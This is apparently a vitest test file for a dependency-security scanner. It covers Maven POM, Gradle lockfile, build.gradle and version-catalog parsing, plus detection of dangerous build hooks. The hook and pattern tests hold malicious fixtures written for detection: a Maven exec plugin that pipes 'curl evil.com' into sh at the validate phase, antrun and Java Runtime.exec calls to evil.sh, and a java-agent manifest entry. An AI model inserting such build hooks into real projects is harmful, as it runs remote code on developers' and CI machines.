import { describe, it, expect } from "vitest";
import {
  parsePomContent,
  parseGradleLockfileContent,
  parseBuildGradleContent,
  parseMavenLockfileContent,
  parseVersionCatalogContent,
  extractManagedVersions,
  extractPomModules,
  extractGradleSubprojects,
} from "../src/lockfile/maven-parser.js";
import { extractMavenHooks } from "../src/analyzer/maven-hooks.js";
import { scanPackage } from "../src/analyzer/scanner.js";

// ── pom.xml parser ────────────────────────────────────────────────────────────

describe("parsePomContent", () => {
  const POM = `<?xml version="1.0" encoding="UTF-8"?>
<project>
  <dependencies>
    <dependency>
      <groupId>com.fasterxml.jackson.core</groupId>
      <artifactId>jackson-databind</artifactId>
      <version>2.14.0</version>
    </dependency>
    <dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-core</artifactId>
      <version>5.3.30</version>
    </dependency>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.13.2</version>
      <scope>test</scope>
    </dependency>
    <dependency>
      <groupId>javax.servlet</groupId>
      <artifactId>javax.servlet-api</artifactId>
      <version>4.0.1</version>
      <scope>provided</scope>
    </dependency>
  </dependencies>
</project>`;

  it("parses groupId:artifactId as name", () => {
    const { refs } = parsePomContent(POM);
    const names = refs.map((r) => r.name);
    expect(names).toContain("com.fasterxml.jackson.core:jackson-databind");
    expect(names).toContain("org.springframework:spring-core");
  });

  it("skips test scope", () => {
    const { refs } = parsePomContent(POM);
    const names = refs.map((r) => r.name);
    expect(names).not.toContain("junit:junit");
  });

  it("skips provided scope", () => {
    const { refs } = parsePomContent(POM);
    const names = refs.map((r) => r.name);
    expect(names).not.toContain("javax.servlet:javax.servlet-api");
  });

  it("sets correct versions", () => {
    const { refs } = parsePomContent(POM);
    const jackson = refs.find((r) => r.name === "com.fasterxml.jackson.core:jackson-databind");
    expect(jackson?.version).toBe("2.14.0");
  });

  it("integrity is null (Maven Central provides SHA separately)", () => {
    const { refs } = parsePomContent(POM);
    expect(refs.every((r) => r.integrity === null)).toBe(true);
  });

  it("skips range versions", () => {
    const pom = `<project><dependencies>
      <dependency>
        <groupId>com.example</groupId><artifactId>foo</artifactId>
        <version>[1.0,2.0)</version>
      </dependency>
    </dependencies></project>`;
    const { refs } = parsePomContent(pom);
    expect(refs).toHaveLength(0);
  });

  it("skips property placeholder versions and counts them", () => {
    const pom = `<project><dependencies>
      <dependency>
        <groupId>com.example</groupId><artifactId>foo</artifactId>
        <version>${"${spring.version}"}</version>
      </dependency>
    </dependencies></project>`;
    const { refs, versionlessCount } = parsePomContent(pom);
    expect(refs).toHaveLength(0);
    expect(versionlessCount).toBe(1);
  });

  it("counts versionless (BOM-managed) dependencies", () => {
    const pom = `<project><dependencies>
      <dependency><groupId>g</groupId><artifactId>a</artifactId></dependency>
      <dependency><groupId>g</groupId><artifactId>b</artifactId></dependency>
      <dependency><groupId>g</groupId><artifactId>c</artifactId><version>1.0</version></dependency>
    </dependencies></project>`;
    const { refs, versionlessCount } = parsePomContent(pom);
    expect(refs).toHaveLength(1);
    expect(versionlessCount).toBe(2);
  });

  it("deduplicates repeated entries", () => {
    const pom = `<project><dependencies>
      <dependency><groupId>g</groupId><artifactId>a</artifactId><version>1.0</version></dependency>
      <dependency><groupId>g</groupId><artifactId>a</artifactId><version>1.0</version></dependency>
    </dependencies></project>`;
    const { refs } = parsePomContent(pom);
    expect(refs).toHaveLength(1);
  });
});

// ── extractManagedVersions + parent POM inheritance ───────────────────────────

describe("extractManagedVersions", () => {
  it("extracts versions from <dependencyManagement> block", () => {
    const pom = `<project>
  <dependencyManagement>
    <dependencies>
      <dependency>
        <groupId>com.fasterxml.jackson.core</groupId>
        <artifactId>jackson-databind</artifactId>
        <version>2.14.0</version>
      </dependency>
      <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-core</artifactId>
        <version>5.3.30</version>
      </dependency>
    </dependencies>
  </dependencyManagement>
</project>`;
    const map = extractManagedVersions(pom);
    expect(map.get("com.fasterxml.jackson.core:jackson-databind")).toBe("2.14.0");
    expect(map.get("org.springframework:spring-core")).toBe("5.3.30");
  });

  it("returns empty map when no <dependencyManagement> block", () => {
    const pom = `<project><dependencies></dependencies></project>`;
    expect(extractManagedVersions(pom).size).toBe(0);
  });

  it("skips property placeholder versions", () => {
    const pom = `<project><dependencyManagement><dependencies>
      <dependency><groupId>g</groupId><artifactId>a</artifactId><version>${"${spring.version}"}</version></dependency>
    </dependencies></dependencyManagement></project>`;
    expect(extractManagedVersions(pom).size).toBe(0);
  });
});

describe("parsePomContent — parent POM version inheritance", () => {
  it("does NOT include <dependencyManagement> entries as direct deps", () => {
    const pom = `<project>
  <dependencyManagement>
    <dependencies>
      <dependency><groupId>g</groupId><artifactId>managed</artifactId><version>1.0</version></dependency>
    </dependencies>
  </dependencyManagement>
  <dependencies>
    <dependency><groupId>g</groupId><artifactId>direct</artifactId><version>2.0</version></dependency>
  </dependencies>
</project>`;
    const { refs } = parsePomContent(pom);
    const names = refs.map((r) => r.name);
    expect(names).toContain("g:direct");
    expect(names).not.toContain("g:managed");
  });

  it("resolves versionless deps from passed managedVersions map", () => {
    const pom = `<project><dependencies>
      <dependency><groupId>com.example</groupId><artifactId>foo</artifactId></dependency>
    </dependencies></project>`;
    const managed = new Map([["com.example:foo", "3.0"]]);
    const { refs, versionlessCount } = parsePomContent(pom, managed);
    expect(refs).toHaveLength(1);
    expect(refs[0]?.version).toBe("3.0");
    expect(versionlessCount).toBe(0);
  });

  it("resolves from same-file <dependencyManagement> when passed as map", () => {
    const pom = `<project>
  <dependencyManagement>
    <dependencies>
      <dependency><groupId>g</groupId><artifactId>a</artifactId><version>4.0</version></dependency>
    </dependencies>
  </dependencyManagement>
  <dependencies>
    <dependency><groupId>g</groupId><artifactId>a</artifactId></dependency>
  </dependencies>
</project>`;
    const managed = extractManagedVersions(pom);
    const { refs, versionlessCount } = parsePomContent(pom, managed);
    expect(refs).toHaveLength(1);
    expect(refs[0]?.version).toBe("4.0");
    expect(versionlessCount).toBe(0);
  });

  it("still counts truly unresolvable deps as versionless", () => {
    const pom = `<project><dependencies>
      <dependency><groupId>g</groupId><artifactId>external-bom</artifactId></dependency>
    </dependencies></project>`;
    const { refs, versionlessCount } = parsePomContent(pom, new Map());
    expect(refs).toHaveLength(0);
    expect(versionlessCount).toBe(1);
  });
});

// ── gradle.lockfile parser ─────────────────────────────────────────────────────

describe("parseGradleLockfileContent", () => {
  const GRADLE_LOCK = `# This is a Gradle generated file for dependency locking.
# Manual edits can break the build and are not advised.
# This file is expected to be part of source control.
com.google.guava:guava:31.1-jre=compileClasspath,runtimeClasspath
com.fasterxml.jackson.core:jackson-databind:2.14.0=compileClasspath,runtimeClasspath
org.slf4j:slf4j-api:1.7.36=compileClasspath,runtimeClasspath
empty=`;

  it("parses groupId:artifactId as name", () => {
    const refs = parseGradleLockfileContent(GRADLE_LOCK);
    const names = refs.map((r) => r.name);
    expect(names).toContain("com.google.guava:guava");
    expect(names).toContain("com.fasterxml.jackson.core:jackson-databind");
    expect(names).toContain("org.slf4j:slf4j-api");
  });

  it("parses versions correctly", () => {
    const refs = parseGradleLockfileContent(GRADLE_LOCK);
    const guava = refs.find((r) => r.name === "com.google.guava:guava");
    expect(guava?.version).toBe("31.1-jre");
  });

  it("skips comment lines", () => {
    const refs = parseGradleLockfileContent(GRADLE_LOCK);
    // 3 real deps + 1 "empty=" line that should be skipped (no 3-part coord)
    expect(refs).toHaveLength(3);
  });
});

// ── build.gradle parser ───────────────────────────────────────────────────────

describe("parseBuildGradleContent", () => {
  const BUILD_GRADLE = `
plugins {
  id 'java'
}

dependencies {
  implementation 'com.google.guava:guava:31.1-jre'
  implementation("com.fasterxml.jackson.core:jackson-databind:2.14.0")
  testImplementation 'junit:junit:4.13.2'
  compileOnly 'javax.servlet:javax.servlet-api:4.0.1'
  api 'org.springframework:spring-core:5.3.30'
}
`;

  it("extracts implementation dependencies", () => {
    const refs = parseBuildGradleContent(BUILD_GRADLE);
    const names = refs.map((r) => r.name);
    expect(names).toContain("com.google.guava:guava");
    expect(names).toContain("com.fasterxml.jackson.core:jackson-databind");
  });

  it("extracts various configuration types", () => {
    const refs = parseBuildGradleContent(BUILD_GRADLE);
    const names = refs.map((r) => r.name);
    expect(names).toContain("junit:junit");
    expect(names).toContain("javax.servlet:javax.servlet-api");
    expect(names).toContain("org.springframework:spring-core");
  });

  it("handles both single-quote and parenthesis forms", () => {
    const refs = parseBuildGradleContent(BUILD_GRADLE);
    // jackson uses parenthesis form
    const jackson = refs.find((r) => r.name === "com.fasterxml.jackson.core:jackson-databind");
    expect(jackson?.version).toBe("2.14.0");
  });

  it("skips Gradle variable interpolation", () => {
    const gradle = `dependencies { implementation "com.example:foo:$fooVersion" }`;
    const refs = parseBuildGradleContent(gradle);
    expect(refs).toHaveLength(0);
  });
});

// ── parseMavenLockfileContent dispatch ───────────────────────────────────────

describe("parseMavenLockfileContent", () => {
  it("dispatches to pom parser for pom.xml", () => {
    const pom = `<project><dependencies>
      <dependency><groupId>g</groupId><artifactId>a</artifactId><version>1.0</version></dependency>
    </dependencies></project>`;
    const { refs } = parseMavenLockfileContent(pom, "pom.xml");
    expect(refs).toHaveLength(1);
    expect(refs[0]?.name).toBe("g:a");
  });

  it("dispatches to gradle lockfile parser for gradle.lockfile", () => {
    const lock = `com.example:foo:1.0=runtimeClasspath`;
    const { refs } = parseMavenLockfileContent(lock, "gradle.lockfile");
    expect(refs).toHaveLength(1);
    expect(refs[0]?.name).toBe("com.example:foo");
  });

  it("returns empty for unknown filename", () => {
    const { refs } = parseMavenLockfileContent("anything", "settings.gradle");
    expect(refs).toHaveLength(0);
  });
});

// ── extractPomModules ─────────────────────────────────────────────────────────

describe("extractPomModules", () => {
  it("extracts <module> entries from <modules> block", () => {
    const pom = `<project>
  <modules>
    <module>core</module>
    <module>web</module>
    <module>cli</module>
  </modules>
</project>`;
    expect(extractPomModules(pom)).toEqual(["core", "web", "cli"]);
  });

  it("returns empty array when no <modules> block", () => {
    const pom = `<project><dependencies></dependencies></project>`;
    expect(extractPomModules(pom)).toHaveLength(0);
  });

  it("handles relative path modules", () => {
    const pom = `<project><modules><module>../shared</module></modules></project>`;
    expect(extractPomModules(pom)).toEqual(["../shared"]);
  });

  it("trims whitespace from module paths", () => {
    const pom = `<project><modules><module>  core  </module></modules></project>`;
    expect(extractPomModules(pom)).toEqual(["core"]);
  });
});

// ── extractGradleSubprojects ──────────────────────────────────────────────────

describe("extractGradleSubprojects", () => {
  it("extracts Groovy-style include with colon prefix", () => {
    const settings = `include ':core', ':web', ':cli'`;
    const paths = extractGradleSubprojects(settings);
    expect(paths).toContain("core");
    expect(paths).toContain("web");
    expect(paths).toContain("cli");
  });

  it("extracts Kotlin DSL include() calls", () => {
    const settings = `include(":core")\ninclude(":web")`;
    const paths = extractGradleSubprojects(settings);
    expect(paths).toContain("core");
    expect(paths).toContain("web");
  });

  it("converts nested :sub:module notation to sub/module path", () => {
    const settings = `include ':api:v1', ':api:v2'`;
    const paths = extractGradleSubprojects(settings);
    expect(paths).toContain("api/v1");
    expect(paths).toContain("api/v2");
  });

  it("deduplicates repeated includes", () => {
    const settings = `include ':core'\ninclude ':core'`;
    expect(extractGradleSubprojects(settings)).toHaveLength(1);
  });

  it("returns empty array when no include statements", () => {
    const settings = `rootProject.name = 'my-project'`;
    expect(extractGradleSubprojects(settings)).toHaveLength(0);
  });
});

// ── maven-hooks.ts ────────────────────────────────────────────────────────────

describe("extractMavenHooks", () => {
  it("extracts exec-maven-plugin configuration", () => {
    const pom = `<project>
  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>exec-maven-plugin</artifactId>
        <version>3.1.0</version>
        <executions>
          <execution>
            <phase>validate</phase>
            <goals><goal>exec</goal></goals>
            <configuration>
              <executable>bash</executable>
              <commandlineArgs>-c "curl evil.com | sh"</commandlineArgs>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>`;
    const hooks = extractMavenHooks(pom);
    const keys = Object.keys(hooks);
    expect(keys.length).toBeGreaterThan(0);
    expect(keys.some((k) => k.includes("exec-maven-plugin"))).toBe(true);
  });

  it("extracts maven-antrun-plugin configuration", () => {
    const pom = `<project><build><plugins>
      <plugin>
        <artifactId>maven-antrun-plugin</artifactId>
        <executions>
          <execution>
            <phase>compile</phase>
            <configuration>
              <target>
                <exec executable="bash"><arg value="-c"/><arg value="evil.sh"/></exec>
              </target>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins></build></project>`;
    const hooks = extractMavenHooks(pom);
    expect(Object.keys(hooks).some((k) => k.includes("maven-antrun-plugin"))).toBe(true);
  });

  it("returns empty hooks for clean pom without dangerous plugins", () => {
    const pom = `<project><build><plugins>
      <plugin>
        <artifactId>maven-compiler-plugin</artifactId>
        <version>3.11.0</version>
        <configuration>
          <source>17</source>
          <target>17</target>
        </configuration>
      </plugin>
    </plugins></build></project>`;
    const hooks = extractMavenHooks(pom);
    expect(Object.keys(hooks)).toHaveLength(0);
  });

  it("flags plugins with <executable> even if not in known dangerous list", () => {
    const pom = `<project><build><plugins>
      <plugin>
        <artifactId>custom-plugin</artifactId>
        <configuration>
          <executable>/bin/evil</executable>
        </configuration>
      </plugin>
    </plugins></build></project>`;
    const hooks = extractMavenHooks(pom);
    expect(Object.keys(hooks).length).toBeGreaterThan(0);
  });
});

// ── pattern matching for pom.xml and Java files ────────────────────────────

describe("pattern matching — Maven / Java", () => {
  const emptyFileMap = new Map<string, string>();

  it("maven_exec_plugin pattern fires on pom.xml source", () => {
    const hooks = { "pom.xml": `<artifactId>exec-maven-plugin</artifactId>` };
    const { findings } = scanPackage(hooks, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "maven_exec_plugin")).toBe(true);
  });

  it("maven_exec_plugin pattern does NOT fire on .go source", () => {
    const hooks = { "main.go": `exec-maven-plugin` };
    const { findings } = scanPackage(hooks, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "maven_exec_plugin")).toBe(false);
  });

  it("java_exec pattern fires on .java source", () => {
    const hooks = { "Payload.java": `Runtime.getRuntime().exec("bash -c evil.sh")` };
    const { findings } = scanPackage(hooks, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "java_exec")).toBe(true);
  });

  it("java_agent pattern fires on MANIFEST.MF source", () => {
    const hooks = { "META-INF/MANIFEST.MF": `Manifest-Version: 1.0\nPremain-Class: com.evil.Agent\n` };
    const { findings } = scanPackage(hooks, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "java_agent")).toBe(true);
  });

  it("java_agent pattern does NOT fire on .java source", () => {
    const hooks = { "Agent.java": `// Premain-Class: com.evil.Agent` };
    const { findings } = scanPackage(hooks, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "java_agent")).toBe(false);
  });

  it("network pattern does NOT fire on pom.xml source (Maven has dedicated patterns)", () => {
    const hooks = { "pom.xml": `curl https://example.com` };
    const { findings } = scanPackage(hooks, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "network")).toBe(false);
  });

  it("java_classload pattern fires on .java source", () => {
    const hooks = { "Loader.java": `Class.forName(className)` };
    const { findings } = scanPackage(hooks, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "java_classload")).toBe(true);
  });
});

// ── Gradle version catalog parser (libs.versions.toml) ───────────────────────

describe("parseVersionCatalogContent", () => {
  const CATALOG = `
[versions]
jackson = "2.14.0"
spring = "5.3.30"
guava = "31.1-jre"

[libraries]
jackson-databind = { group = "com.fasterxml.jackson.core", name = "jackson-databind", version.ref = "jackson" }
spring-core = { group = "org.springframework", name = "spring-core", version.ref = "spring" }
guava = { module = "com.google.guava:guava", version.ref = "guava" }
logback = { module = "ch.qos.logback:logback-classic", version = "1.4.11" }

[bundles]
test-libs = ["jackson-databind"]

[plugins]
android = { id = "com.android.application", version = "8.0.0" }
`;

  it("resolves version.ref entries", () => {
    const { refs } = parseVersionCatalogContent(CATALOG);
    const jackson = refs.find((r) => r.name === "com.fasterxml.jackson.core:jackson-databind");
    expect(jackson?.version).toBe("2.14.0");
  });

  it("resolves group+name form", () => {
    const { refs } = parseVersionCatalogContent(CATALOG);
    const spring = refs.find((r) => r.name === "org.springframework:spring-core");
    expect(spring?.version).toBe("5.3.30");
  });

  it("resolves module shorthand form", () => {
    const { refs } = parseVersionCatalogContent(CATALOG);
    const guava = refs.find((r) => r.name === "com.google.guava:guava");
    expect(guava?.version).toBe("31.1-jre");
  });

  it("resolves inline version (no ref)", () => {
    const { refs } = parseVersionCatalogContent(CATALOG);
    const logback = refs.find((r) => r.name === "ch.qos.logback:logback-classic");
    expect(logback?.version).toBe("1.4.11");
  });

  it("ignores [bundles] and [plugins] sections", () => {
    const { refs } = parseVersionCatalogContent(CATALOG);
    // plugins section has no library entries — result count should be exactly 4
    expect(refs).toHaveLength(4);
  });

  it("counts entries with no resolvable version", () => {
    const catalog = `
[versions]
# empty

[libraries]
foo = { module = "com.example:foo" }
bar = { group = "com.example", name = "bar" }
baz = { module = "com.example:baz", version.ref = "missing" }
`;
    const { refs, versionlessCount } = parseVersionCatalogContent(catalog);
    expect(refs).toHaveLength(0);
    expect(versionlessCount).toBe(3);
  });

  it("deduplicates repeated entries", () => {
    const catalog = `
[versions]
v = "1.0"

[libraries]
foo = { module = "com.example:foo", version.ref = "v" }
foo2 = { module = "com.example:foo", version.ref = "v" }
`;
    const { refs } = parseVersionCatalogContent(catalog);
    expect(refs).toHaveLength(1);
  });

  it("dispatches via parseMavenLockfileContent for gradle/libs.versions.toml filename", () => {
    const catalog = `
[versions]
v = "2.0"

[libraries]
dep = { module = "com.example:dep", version.ref = "v" }
`;
    const { refs } = parseMavenLockfileContent(catalog, "gradle/libs.versions.toml");
    expect(refs).toHaveLength(1);
    expect(refs[0]?.version).toBe("2.0");
  });

  it("dispatches via parseMavenLockfileContent for libs.versions.toml filename", () => {
    const catalog = `
[versions]
v = "3.0"

[libraries]
dep = { module = "com.example:dep", version.ref = "v" }
`;
    const { refs } = parseMavenLockfileContent(catalog, "libs.versions.toml");
    expect(refs).toHaveLength(1);
    expect(refs[0]?.version).toBe("3.0");
  });
});
